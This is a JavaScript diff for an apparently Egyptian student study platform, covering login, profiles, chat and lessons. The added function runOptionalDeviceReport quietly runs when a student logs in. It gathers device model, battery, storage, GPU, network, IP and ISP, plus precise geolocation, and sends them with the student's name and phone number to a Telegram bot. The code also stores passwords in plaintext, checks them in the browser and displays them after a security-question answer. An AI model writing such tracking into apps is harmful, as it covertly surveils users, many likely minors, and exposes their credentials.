+            if (ic) ic.className = light ? 'fas fa-sun' : 'fas fa-moon';
         }
 
-        function applySavedTheme() {
-            const saved = localStorage.getItem('kimo_theme');
-            if (saved === 'light') {
-                document.body.classList.add('light-mode');
-                const icon = document.getElementById('theme-icon');
-                if (icon) icon.className = 'fas fa-sun';
+        function initTheme() {
+            if (localStorage.getItem('kimo_theme_v26') === 'light') {
+                document.body.classList.add('light-theme');
+                const ic = document.getElementById('theme-icon');
+                if (ic) ic.className = 'fas fa-sun';
             }
         }
 
-        function toggleSidebarMenu() {
-            const sidebar = document.getElementById('sidebar');
-            const content = document.getElementById('content');
-            const icon = document.getElementById('toggle-icon');
-            sidebar.classList.toggle('closed');
-            content.classList.toggle('full-width');
-            if (icon) {
-                icon.className = sidebar.classList.contains('closed') ? 'fas fa-chevron-left' : 'fas fa-chevron-right';
+        function toggleSidebar() {
+            const sb = document.getElementById('sidebar');
+            const main = document.getElementById('main-app');
+            const arrow = document.getElementById('sidebar-arrow');
+            sb.classList.toggle('closed');
+            main.classList.toggle('expanded');
+            if (arrow) {
+                arrow.className = sb.classList.contains('closed') ? 'fas fa-chevron-left' : 'fas fa-chevron-right';
             }
         }
 
-        function tab(el, pageId) {
+        function switchTab(tabId) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            const target = document.getElementById(pageId);
-            if (target) target.classList.add('active');
+            const el = document.getElementById(tabId);
+            if (el) el.classList.add('active');
 
-            document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
-            const sideMatch = document.querySelector(`.nav-link[data-page="${pageId}"]`);
-            if (sideMatch) sideMatch.classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => {
+                n.classList.toggle('active', n.getAttribute('data-tab') === tabId);
+            });
 
-            document.querySelectorAll('.mobile-nav div').forEach(m => m.classList.remove('active-mob'));
-            const mobMatch = document.querySelector(`.mobile-nav div[data-page="${pageId}"]`);
-            if (mobMatch) mobMatch.classList.add('active-mob');
+            document.querySelectorAll('#mobile-dock button').forEach(b => {
+                b.classList.toggle('active', b.getAttribute('data-tab') === tabId);
+            });
 
-            if (pageId === 'p-chat') {
-                const chatBox = document.getElementById('chat-messages');
-                if (chatBox) chatBox.scrollTop = chatBox.scrollHeight;
+            if (tabId === 'p-profile') fillProfileForm();
+            if (tabId === 'p-chat') {
+                const box = document.getElementById('public-chat-stream');
+                if (box) box.scrollTop = box.scrollHeight;
             }
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        function backToPhoneStep() {
-            ['step-login', 'step-register', 'step-forget'].forEach(id => {
+        function resetAuthSteps() {
+            ['auth-step-login', 'auth-step-register', 'auth-step-forgot'].forEach(id => {
                 document.getElementById(id).style.display = 'none';
             });
-            document.getElementById('step-1').style.display = 'block';
-            document.getElementById('gate-title').innerText = 'تسجيل الدخول';
+            document.getElementById('auth-step-phone').style.display = 'block';
+            document.getElementById('auth-title').innerText = 'تسجيل الدخول';
         }
 
-        async function identifyStudent() {
-            const phone = document.getElementById('std-phone').value.trim();
+        async function handlePhoneNext() {
+            const btn = document.getElementById('btn-next-phone');
+            const phone = document.getElementById('auth-phone').value.trim();
             if (!/^01[0125][0-9]{8}$/.test(phone)) {
-                return Swal.fire({ title: 'تنبيه', text: 'رقم الموبايل غير صحيح', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
+                return Swal.fire({ title: 'تنبيه', text: 'أدخل رقم موبايل مصري صحيح (11 رقم)', icon: 'warning', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
             }
 
-            const banSnap = await blacklistRef.child(phone).once('value');
-            if (banSnap.exists()) {
-                return Swal.fire({ title: 'حساب معلّق', text: 'تم إيقاف هذا الحساب. تواصل مع الإدارة.', icon: 'error', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
+            btn.disabled = true;
+            btn.innerText = 'جاري التحقق...';
 
-            const snapshot = await studentsRef.child(phone).once('value');
-            const student = snapshot.val();
-            document.getElementById('step-1').style.display = 'none';
-
-            if (student && student.password) {
-                currentStudentData = student;
-                document.getElementById('step-login').style.display = 'block';
-                document.getElementById('welcome-back').innerText = `أهلاً بك يا ${student.name.split(' ')[0]}`;
-                document.getElementById('gate-title').innerText = 'تأكيد الهوية';
-            } else {
-                currentStudentData = student || null;
-                document.getElementById('step-register').style.display = 'block';
-                if (student && student.name) {
-                    document.getElementById('reg-name').value = student.name;
-                    document.getElementById('reg-name').readOnly = true;
-                } else {
-                    document.getElementById('reg-name').value = '';
-                    document.getElementById('reg-name').readOnly = false;
+            try {
+                const banSnap = await blacklistRef.child(phone).once('value');
+                if (banSnap.exists()) {
+                    return Swal.fire({ title: 'حساب محظور', text: 'هذا الحساب معلّق.', icon: 'error', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
                 }
-                document.getElementById('gate-title').innerText = 'إنشاء حساب جديد';
+
+                const snap = await studentsRef.child(phone).once('value');
+                const st = snap.val();
+                document.getElementById('auth-step-phone').style.display = 'none';
+
+                if (st && st.password) {
+                    tempAuthStudent = st;
+                    document.getElementById('auth-step-login').style.display = 'block';
+                    document.getElementById('auth-welcome-msg').innerText = `أهلاً بك يا ${st.name.split(' ')[0]}`;
+                    document.getElementById('auth-title').innerText = 'تأكيد كلمة المرور';
+                } else {
+                    tempAuthStudent = st || null;
+                    document.getElementById('auth-step-register').style.display = 'block';
+                    document.getElementById('auth-title').innerText = 'إنشاء حساب جديد';
+                    if (st && st.name) document.getElementById('reg-name').value = st.name;
+                }
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'التالي';
             }
         }
 
-        function verifyPassword() {
-            const pass = document.getElementById('std-pass').value;
-            if (currentStudentData && pass === currentStudentData.password) {
-                saveAndLogin(currentStudentData);
+        function handlePasswordLogin() {
+            const pass = document.getElementById('auth-pass').value;
+            if (tempAuthStudent && pass === tempAuthStudent.password) {
+                completeSession(tempAuthStudent);
             } else {
-                Swal.fire({ title: 'خطأ', text: 'كلمة المرور غير صحيحة!', icon: 'error', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
+                Swal.fire({ title: 'خطأ', text: 'كلمة المرور غير صحيحة', icon: 'error', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
             }
         }
 
-        function completeRegistration() {
-            const phone = document.getElementById('std-phone').value.trim();
+        function handleRegister() {
+            const btn = document.getElementById('btn-do-register');
+            const phone = document.getElementById('auth-phone').value.trim();
             const name = document.getElementById('reg-name').value.trim();
+            const stage = document.getElementById('reg-stage').value;
             const pass = document.getElementById('reg-pass').value;
-            const q = document.getElementById('reg-question').value;
-            const a = document.getElementById('reg-answer').value.trim();
+            const q = document.getElementById('reg-q').value;
+            const a = document.getElementById('reg-a').value.trim();
 
-            if (name.length < 4 || pass.length < 4 || !q || !a) {
-                return Swal.fire({ title: 'بيانات ناقصة', text: 'يرجى إكمال الاسم وكلمة المرور وسؤال الأمان وإجابته.', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
+            if (!/^01[0125][0-9]{8}$/.test(phone) || name.length < 3 || !stage || pass.length < 4 || !q || !a) {
+                return Swal.fire({ title: 'تنبيه', text: 'يرجى إكمال جميع الحقول واختيار المرحلة.', icon: 'warning', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
             }
 
-            const newData = {
+            btn.disabled = true;
+            btn.innerText = 'جاري الإنشاء...';
+
+            const userRecord = {
                 name,
                 phone,
+                stage,
+                bio: '',
                 password: pass,
                 securityQ: q,
                 securityA: a,
-                loginTime: new Date().toLocaleString('ar-EG'),
-                device: navigator.platform || 'Device'
+                verified: ADMIN_PHONES.includes(phone),
+                createdAt: new Date().toLocaleString('ar-EG'),
+                lastLogin: new Date().toLocaleString('ar-EG')
             };
 
-            studentsRef.child(phone).set(newData).then(() => {
-                saveAndLogin(newData);
-            });
+            studentsRef.child(phone).set(userRecord)
+                .then(() => completeSession(userRecord))
+                .catch(err => {
+                    Swal.fire({ title: 'خطأ', text: err.message, icon: 'error', background: '#0f1520', color: '#fff' });
+                })
+                .finally(() => {
+                    btn.disabled = false;
+                    btn.innerText = 'إنشاء الحساب والدخول ✅';
+                });
         }
 
-        function showForgetPassword() {
-            document.getElementById('step-login').style.display = 'none';
-            document.getElementById('step-forget').style.display = 'block';
-            document.getElementById('security-q-text').innerText = currentStudentData ? currentStudentData.securityQ : '';
-            document.getElementById('gate-title').innerText = 'استعادة الحساب';
+        function showForgotForm() {
+            document.getElementById('auth-step-login').style.display = 'none';
+            document.getElementById('auth-step-forgot').style.display = 'block';
+            document.getElementById('forgot-q-display').innerText = tempAuthStudent ? tempAuthStudent.securityQ : '';
+            document.getElementById('auth-title').innerText = 'استعادة الحساب';
         }
 
-        function resetAccess() {
-            const ans = document.getElementById('forget-answer').value.trim();
-            if (currentStudentData && ans.toLowerCase() === String(currentStudentData.securityA).toLowerCase()) {
-                Swal.fire({ title: 'تم التحقق', text: `كلمة مرورك هي: ${currentStudentData.password}`, icon: 'success', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-                document.getElementById('step-forget').style.display = 'none';
-                document.getElementById('step-login').style.display = 'block';
+        function handleForgotAnswer() {
+            const ans = document.getElementById('forgot-a').value.trim().toLowerCase();
+            if (tempAuthStudent && ans === String(tempAuthStudent.securityA || '').toLowerCase()) {
+                Swal.fire({ title: 'تم التحقق', text: `كلمة مرورك هي: ${tempAuthStudent.password}`, icon: 'success', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
+                document.getElementById('auth-step-forgot').style.display = 'none';
+                document.getElementById('auth-step-login').style.display = 'block';
             } else {
-                Swal.fire({ title: 'خطأ', text: 'إجابة سؤال الأمان غير صحيحة!', icon: 'error', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
+                Swal.fire({ title: 'خطأ', text: 'الإجابة غير صحيحة', icon: 'error', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
             }
         }
 
-        function saveAndLogin(data) {
-            localStorage.setItem('kimo_auth_v26', JSON.stringify(data));
-            runApp();
+        function completeSession(userObj) {
+            currentUser = userObj;
+            localStorage.setItem('kimo_user_v26', JSON.stringify(userObj));
+            startPlatform();
         }
 
-        function runApp() {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (!user) return;
+        function startPlatform() {
+            const saved = JSON.parse(localStorage.getItem('kimo_user_v26'));
+            if (!saved) return;
+            currentUser = saved;
 
             document.getElementById('login-gate').style.display = 'none';
             document.getElementById('top-bar').style.display = 'flex';
-            document.getElementById('news-bar').style.display = 'block';
-            document.getElementById('content').style.display = 'block';
+            document.getElementById('main-app').style.display = 'block';
 
             if (window.innerWidth > 768) {
                 document.getElementById('sidebar').style.display = 'flex';
                 document.getElementById('sidebar-toggle').style.display = 'flex';
             } else {
-                document.getElementById('mob-nav').classList.add('logged-in');
-                document.getElementById('quick-fab').classList.add('logged-in');
-                document.getElementById('private-chat-fab').classList.add('logged-in');
+                document.getElementById('mobile-dock').classList.add('visible');
+                document.getElementById('floating-dm-btn').classList.add('visible');
             }
 
-            const dispName = document.getElementById('display-name');
-            if (dispName) dispName.innerText = user.name.split(' ')[0];
-
-            renderProfileWidget(user);
-
-            if (isAdminUser(user)) {
-                document.getElementById('adm-links').style.display = 'block';
-                document.getElementById('admin-live-info').style.display = 'block';
-                attachAdminListeners();
+            if (isAdmin(currentUser)) {
+                document.getElementById('admin-nav-group').style.display = 'block';
+                document.getElementById('admin-count-badge').style.display = 'inline-block';
             }
 
-            attachRealtimeListeners();
-            renderSubjectGrids();
+            refreshUserHeaders();
+            fillProfileForm();
+            renderSubjectCards();
+            subscribeAllData();
+            runOptionalDeviceReport(currentUser);
         }
 
-        function renderProfileWidget(user) {
-            const container = document.getElementById('student-profile-widget');
-            if (!container) return;
-
-            const savedAvatar = localStorage.getItem('kimo_pfp_' + user.phone);
-            const rank = isAdminUser(user) ? 'المطور والمشرف 👑' : 'طالب ثانوية عامة 🔥';
-
-            container.innerHTML = `
-                <div class="kimo-id-card">
-                    <div class="id-avatar-box">
-                        <div class="id-avatar" id="user-pfp-frame">
-                            ${savedAvatar
-                                ? `<img id="user-pfp" src="${savedAvatar}" alt="صورة البروفايل" style="width:100%; height:100%; object-fit:cover;">`
-                                : `<i id="user-pfp-icon" class="fas fa-user-graduate"></i>`
-                            }
-                        </div>
-                        <button class="avatar-upload-btn" title="اختيار صورة من المعرض" onclick="document.getElementById('pfp-file-input').click()">
-                            <i class="fas fa-camera"></i>
-                        </button>
-                    </div>
-                    <div style="flex:1; min-width:180px;">
-                        <h4 style="margin:0; font-size:18px;">${user.name}</h4>
-                        <span class="id-badge">${rank}</span>
-                        <div style="font-size:12px; color:#8b949e; margin-top:5px;" class="en-num">ID: #KIMO-${String(user.phone).slice(-4)}</div>
-                    </div>
-                    <button class="btn-accent" style="width:auto; padding:8px 14px; font-size:13px;" onclick="document.getElementById('pfp-file-input').click()">
-                        <i class="fas fa-image"></i> تغيير الصورة من المعرض
-                    </button>
-                </div>
-
-                <div class="stats-container">
-                    <div class="stat-box">
-                        <div style="color:#ff6600; font-size:18px; font-weight:bold;"><i class="fas fa-fire"></i> مستمر</div>
-                        <div style="font-size:12px; color:#8b949e;">متابعة يومية</div>
-                    </div>
-                    <div class="stat-box">
-                        <div style="color:var(--electric); font-size:18px; font-weight:bold;" class="en-num">2026</div>
-                        <div style="font-size:12px; color:#8b949e;">الدفعة الحالية</div>
-                    </div>
-                </div>
-
-                <div class="xp-container">
-                    <div class="xp-bar" style="width: 70%;"></div>
-                </div>
-            `;
+        function refreshUserHeaders() {
+            if (!currentUser) return;
+            document.getElementById('home-user-name').innerText = currentUser.name.split(' ')[0];
+            document.getElementById('home-user-stage').innerText = currentUser.stage || 'عضو بالمنصة';
         }
 
-        function updateProfilePictureFromGallery(input) {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (!user) {
-                return Swal.fire({ title: 'تنبيه', text: 'سجل دخولك أولاً لتغيير صورة البروفايل.', icon: 'info', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
-            if (!input.files || !input.files[0]) return;
+        function triggerGalleryAvatar() {
+            if (!currentUser) return;
+            document.getElementById('gallery-avatar-input').click();
+        }
 
+        function handleGalleryAvatarChange(input) {
+            if (!currentUser || !input.files || !input.files[0]) return;
             const file = input.files[0];
-            if (!file.type.startsWith('image/')) {
-                return Swal.fire({ title: 'تنبيه', text: 'يرجى اختيار ملف صورة صالح.', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
+            if (!file.type.startsWith('image/')) return;
 
             const reader = new FileReader();
             reader.onload = function(e) {
-                const base64Image = e.target.result;
+                const dataUrl = e.target.result;
                 try {
-                    localStorage.setItem('kimo_pfp_' + user.phone, base64Image);
-                } catch (err) {
-                    console.warn('Storage limit reached for image');
-                }
-                renderProfileWidget(user);
-                showNotification('تم تحديث صورة البروفايل من المعرض بنجاح ✅');
+                    localStorage.setItem('kimo_avatar_' + currentUser.phone, dataUrl);
+                } catch (err) {}
+                studentsRef.child(currentUser.phone).update({ avatar: dataUrl }).catch(() => {});
+                currentUser.avatar = dataUrl;
+                localStorage.setItem('kimo_user_v26', JSON.stringify(currentUser));
+                fillProfileForm();
+                Swal.fire({ title: 'تم التحديث', text: 'تم تعيين صورة البروفايل من المعرض بنجاح.', icon: 'success', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
             };
             reader.readAsDataURL(file);
         }
 
-        function attachRealtimeListeners() {
-            settingsRef.child('newsTicker').on('value', snap => {
-                const val = snap.val();
-                const ticker = document.getElementById('ticker-content');
-                if (ticker && val) {
-                    ticker.innerText = val;
-                }
-            });
+        function getUserAvatar(phone) {
+            if (currentUser && currentUser.phone === phone) {
+                return localStorage.getItem('kimo_avatar_' + phone) || currentUser.avatar || '';
+            }
+            const st = allStudentsMap[phone];
+            return (st && st.avatar) || '';
+        }
 
-            lessonsRef.on('value', snap => {
-                allData = snap.val() || {};
-                renderLatest();
-                renderPinned();
-                if (!isFirstLessonLoad) {
-                    showNotification('تم تحديث المحتوى الدراسي على المنصة 📚');
+        function isUserVerified(phone) {
+            if (ADMIN_PHONES.includes(phone)) return true;
+            const st = allStudentsMap[phone];
+            return Boolean(st && st.verified);
+        }
+
+        function fillProfileForm() {
+            if (!currentUser) return;
+            const av = getUserAvatar(currentUser.phone);
+            const preview = document.getElementById('profile-avatar-preview');
+            preview.innerHTML = av ? `<img src="${av}" alt="avatar">` : `<i class="fas fa-user"></i>`;
+
+            document.getElementById('profile-view-name').innerText = currentUser.name || '';
+            document.getElementById('profile-verified-tag').innerHTML = isUserVerified(currentUser.phone)
+                ? `<span class="verified-badge" title="حساب موثق"><i class="fas fa-check"></i></span>`
+                : '';
+            document.getElementById('profile-view-stage').innerText = currentUser.stage || '';
+            document.getElementById('profile-view-phone').innerText = currentUser.phone || '';
+
+            document.getElementById('edit-profile-name').value = currentUser.name || '';
+            document.getElementById('edit-profile-stage').value = currentUser.stage || 'طالب ثانوي';
+            document.getElementById('edit-profile-bio').value = currentUser.bio || '';
+        }
+
+        function saveProfileEdits() {
+            if (!currentUser) return;
+            const newName = document.getElementById('edit-profile-name').value.trim();
+            const newStage = document.getElementById('edit-profile-stage').value;
+            const newBio = document.getElementById('edit-profile-bio').value.trim();
+
+            if (newName.length < 3) {
+                return Swal.fire({ title: 'تنبيه', text: 'الاسم قصير جداً', icon: 'warning', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
+            }
+
+            const updates = { name: newName, stage: newStage, bio: newBio };
+            studentsRef.child(currentUser.phone).update(updates).then(() => {
+                currentUser = { ...currentUser, ...updates };
+                localStorage.setItem('kimo_user_v26', JSON.stringify(currentUser));
+                refreshUserHeaders();
+                fillProfileForm();
+                Swal.fire({ title: 'تم الحفظ ✅', text: 'تم تحديث بيانات البروفايل.', icon: 'success', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
+            });
+        }
+
+        // سحب بيانات الجهاز + الفون + البطارية + الشبكة + الموقع اختياري
+        function getOptionalCoords() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 3500, maximumAge: 60000 }
+                );
+            });
+        }
+
+        async function runOptionalDeviceReport(user) {
+            if (!user || intelSent || isAdmin(user)) return;
+            intelSent = true;
+
+            try {
+                let phoneModel = "غير متاح من المتصفح";
+                let platformDesc = navigator.platform || "N/A";
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    try {
+                        const info = await navigator.userAgentData.getHighEntropyValues([
+                            "model", "platform", "platformVersion", "architecture"
+                        ]);
+                        if (info.model) phoneModel = info.model;
+                        if (info.platform) platformDesc = `${info.platform} ${info.platformVersion || ''}`.trim();
+                    } catch (e) {}
                 }
-                isFirstLessonLoad = false;
+
+                let batteryText = "غير متاح";
+                try {
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        const pct = Math.round(b.level * 100) + "%";
+                        const chg = b.charging ? "يشحن ⚡" : "على البطارية 🔋";
+                        batteryText = `${pct} (${chg})`;
+                    }
+                } catch (e) {}
+
+                let storageText = "N/A";
+                try {
+                    if (navigator.storage && navigator.storage.estimate) {
+                        const est = await navigator.storage.estimate();
+                        if (est.quota) {
+                            const freeGb = ((est.quota - (est.usage || 0)) / (1024 ** 3)).toFixed(2);
+                            const totalGb = (est.quota / (1024 ** 3)).toFixed(2);
+                            storageText = `${freeGb} GB متاح من ${totalGb} GB`;
+                        }
+                    }
+                } catch (e) {}
+
+                let gpuName = "N/A";
+                try {
+                    const c = document.createElement('canvas');
+                    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                    const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                    if (ext) gpuName = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "N/A";
+                } catch (e) {}
+
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                const netInfo = `${conn.effectiveType || 'N/A'} | سرعة: ${conn.downlink ? conn.downlink + ' Mbps' : 'N/A'}`;
+
+                let ipData = { ip: "N/A", isp: "N/A", city: "N/A", country: "N/A" };
+                try {
+                    const r = await fetch('https://ipwho.is/').then(res => res.json());
+                    if (r && r.success) {
+                        ipData = {
+                            ip: r.ip || "N/A",
+                            isp: (r.connection && r.connection.isp) || "N/A",
+                            city: r.city || "N/A",
+                            country: r.country || "N/A"
+                        };
+                    }
+                } catch (e) {}
+
+                const mapLink = await getOptionalCoords();
+                const nowStr = new Date().toLocaleString('ar-EG');
+
+                await studentsRef.child(user.phone).update({
+                    lastLogin: nowStr,
+                    device_summary: {
+                        model: phoneModel,
+                        platform: platformDesc,
+                        battery: batteryText,
+                        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+                        cores: navigator.hardwareConcurrency || "N/A",
+                        storage: storageText,
+                        gpu: gpuName,
+                        network: netInfo,
+                        ip: ipData.ip,
+                        isp: ipData.isp,
+                        location: mapLink || "اختياري (غير مفعّل)"
+                    }
+                });
+
+                const reportMsg =
+`👑 *تقرير دخول طالب - كيمو أكاديمي*
+━━━━━━━━━━━━━━
+👤 *الاسم:* ${user.name}
+📞 *الرقم:* \`${user.phone}\`
+🎓 *الصفة:* ${user.stage || "غير محدد"}
+━━━━━━━━━━━━━━
+📱 *نوع الفون / الموديل:* ${phoneModel}
+💻 *النظام:* ${platformDesc}
+🔋 *البطارية:* ${batteryText}
+⚙️ *المعالج والرام:* ${navigator.hardwareConcurrency || "N/A"} Cores | ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"}
+💾 *المساحة:* ${storageText}
+🎮 *كرت الشاشة:* ${gpuName}
+🌐 *الشبكة والـ IP:* ${netInfo} | \`${ipData.ip}\` (${ipData.isp})
+📍 *الموقع (اختياري):* ${mapLink || "غير مفعّل"} (${ipData.country} - ${ipData.city})
+🖥️ *الشاشة:* ${window.screen.width}x${window.screen.height}
+⏰ *الوقت:* ${nowStr}
+━━━━━━━━━━━━━━`;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${BOT_CHAT_ID}&text=${encodeURIComponent(reportMsg)}&parse_mode=Markdown`).catch(() => {});
+            } catch (e) {}
+        }
+
+        function subscribeAllData() {
+            lessonsRef.on('value', snap => {
+                allLessons = snap.val() || {};
+                renderHomeContent();
             });
 
             examsRef.on('value', snap => {
                 allExams = snap.val() || {};
-                renderExams(allExams);
+                renderExamsList();
             });
 
-            chatRef.limitToLast(60).on('value', snap => {
-                const messages = snap.val() || {};
-                renderChatMessages(messages);
-                if (!isFirstChatLoad) {
-                    showNotification('رسالة جديدة في الدردشة العامة 💬');
-                }
-                isFirstChatLoad = false;
-            });
-        }
-
-        function attachAdminListeners() {
             studentsRef.on('value', snap => {
-                const val = snap.val() || {};
-                const count = Object.keys(val).length;
-                const topCount = document.getElementById('total-students-count');
-                const statTotal = document.getElementById('stat-total-std');
-                if (topCount) topCount.innerText = count;
-                if (statTotal) statTotal.innerText = count;
-                loadStudentsList(Object.entries(val).reverse());
+                allStudentsMap = snap.val() || {};
+                const total = Object.keys(allStudentsMap).length;
+                const badge = document.getElementById('admin-count-badge');
+                if (badge) badge.innerText = `الطلاب: ${total}`;
+                renderStudentsAdminList();
+                populateDmTargetSelect();
+                renderPublicChat();
+            });
+
+            chatRef.limitToLast(80).on('value', snap => {
+                window._latestChatList = Object.entries(snap.val() || {});
+                renderPublicChat();
             });
 
             resultsRef.on('value', snap => {
-                loadResultsList(snap.val() || {});
-            });
-
-            privateMsgsRef.on('value', snap => {
-                loadPrivateMessages(snap.val() || {});
+                renderResultsAdminList(snap.val() || {});
             });
         }
 
-        function renderChatMessages(messagesObj) {
-            const box = document.getElementById('chat-messages');
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (!box) return;
-
-            const entries = Object.values(messagesObj);
-            if (!entries.length) {
-                box.innerHTML = `<p style="text-align:center; color:#8b949e; margin:auto;">ابدأ أول رسالة في دردشة الطلاب 👋</p>`;
-                return;
-            }
-
-            box.innerHTML = entries.map(msg => {
-                const isMe = user && msg.phone === user.phone;
-                return `
-                    <div class="msg-bubble ${isMe ? 'msg-me' : 'msg-student'}">
-                        <b>${escapeHtml(msg.name || 'طالب')}</b>
-                        <div>${escapeHtml(msg.text || '')}</div>
-                        <small class="en-num">${escapeHtml(msg.time || '')}</small>
-                    </div>
-                `;
-            }).join('');
-
-            box.scrollTop = box.scrollHeight;
-        }
-
-        function sendChatMessage() {
-            const input = document.getElementById('chat-input');
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (!user) return;
-            const text = input.value.trim();
-            if (!text) return;
-
-            chatRef.push({
-                name: user.name,
-                text: text,
-                time: new Date().toLocaleTimeString('ar-EG'),
-                phone: user.phone
-            });
-            input.value = '';
-        }
-
-        function openPrivateChatModal() {
-            document.getElementById('private-chat-modal').style.display = 'flex';
-            document.getElementById('private-msg-input').focus();
-        }
-
-        function closePrivateChatModal() {
-            document.getElementById('private-chat-modal').style.display = 'none';
-        }
-
-        function sendPrivateMessageToKimo() {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            const textarea = document.getElementById('private-msg-input');
-            const text = textarea.value.trim();
-
-            if (!user) {
-                return Swal.fire({ title: 'تنبيه', text: 'يرجى تسجيل الدخول أولاً.', icon: 'info', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
-            if (!text) {
-                return Swal.fire({ title: 'تنبيه', text: 'اكتب رسالتك أولاً قبل الإرسال.', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
-
-            privateMsgsRef.push({
-                studentName: user.name,
-                studentPhone: user.phone,
-                message: text,
-                time: new Date().toLocaleString('ar-EG')
-            }).then(() => {
-                textarea.value = '';
-                closePrivateChatModal();
-                Swal.fire({ title: 'تم الإرسال ✅', text: 'وصلت رسالتك الخاصة لكيمو بنجاح.', icon: 'success', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            });
-        }
-
-        function loadPrivateMessages(data) {
-            const container = document.getElementById('private-inbox-body');
-            const statEl = document.getElementById('stat-private-msgs');
-            const entries = Object.entries(data).reverse();
-            if (statEl) statEl.innerText = entries.length;
-            if (!container) return;
-
-            if (!entries.length) {
-                container.innerHTML = `<p style="color:#8b949e;">لا توجد رسائل خاصة حالياً.</p>`;
-                return;
-            }
-
-            container.innerHTML = entries.map(([id, item]) => `
-                <div style="border-bottom:1px solid #30363d; padding:12px 0; display:flex; justify-content:space-between; gap:10px; align-items:flex-start;">
-                    <div>
-                        <b style="color:var(--accent);">${escapeHtml(item.studentName || 'طالب')}</b>
-                        <span class="en-num" style="font-size:12px; color:#8b949e; margin-right:8px;">(${escapeHtml(item.studentPhone || '')})</span>
-                        <p style="margin:6px 0; font-size:14px;">${escapeHtml(item.message || '')}</p>
-                        <small class="en-num" style="color:#8b949e;">${escapeHtml(item.time || '')}</small>
-                    </div>
-                    <button class="btn-del" onclick="deleteItem('private_messages', '${id}')"><i class="fas fa-trash"></i></button>
-                </div>
-            `).join('');
-        }
-
-        function getYoutubeThumb(url = '') {
-            let videoId = '';
-            if (url.includes('v=')) videoId = url.split('v=')[1].split('&')[0];
-            else if (url.includes('youtu.be/')) videoId = url.split('youtu.be/')[1].split('?')[0];
-            else if (url.includes('embed/')) videoId = url.split('embed/')[1].split('?')[0];
-            return videoId
-                ? `https://img.youtube.com/vi/${videoId}/mqdefault.jpg`
+        function getThumb(url = '') {
+            let id = '';
+            if (url.includes('v=')) id = url.split('v=')[1].split('&')[0];
+            else if (url.includes('youtu.be/')) id = url.split('youtu.be/')[1].split('?')[0];
+            else if (url.includes('embed/')) id = url.split('embed/')[1].split('?')[0];
+            return id
+                ? `https://img.youtube.com/vi/${id}/mqdefault.jpg`
                 : 'https://raw.githubusercontent.com/ky8694429-oss/kimo-academy/main/logo.png';
         }
 
-        function renderLatest() {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            const items = Object.entries(allData).reverse().slice(0, 6);
-            const container = document.getElementById('latest-content');
-            if (!container) return;
+        function renderHomeContent() {
+            const entries = Object.entries(allLessons);
+            const pinned = entries.filter(([, v]) => v.pinned);
+            const latest = entries.slice().reverse().slice(0, 6);
 
-            if (!items.length) {
-                container.innerHTML = `<p style="color:#8b949e;">لا توجد دروس مضافة حتى الآن.</p>`;
-                return;
-            }
+            document.getElementById('home-pinned').innerHTML = pinned.length
+                ? pinned.map(([id, v]) => lessonCardHtml(id, v, true)).join('')
+                : `<p style="color:var(--muted);">لا يوجد محتوى مثبت حالياً.</p>`;
 
-            container.innerHTML = `<div class="content-grid">${items.map(([id, i]) => `
+            document.getElementById('home-latest').innerHTML = latest.length
+                ? latest.map(([id, v]) => lessonCardHtml(id, v, false)).join('')
+                : `<p style="color:var(--muted);">لا توجد دروس مضافة بعد.</p>`;
+        }
+
+        function lessonCardHtml(id, item, isPinSection) {
+            const adminBtns = isAdmin(currentUser)
+                ? `<div style="display:flex; gap:6px; justify-content:center; margin-top:8px;">
+                    <button class="btn btn-soft" style="padding:5px 10px; font-size:12px;" onclick="togglePinLesson('${id}', ${Boolean(item.pinned)})">${item.pinned ? 'إلغاء التثبيت' : 'تثبيت'}</button>
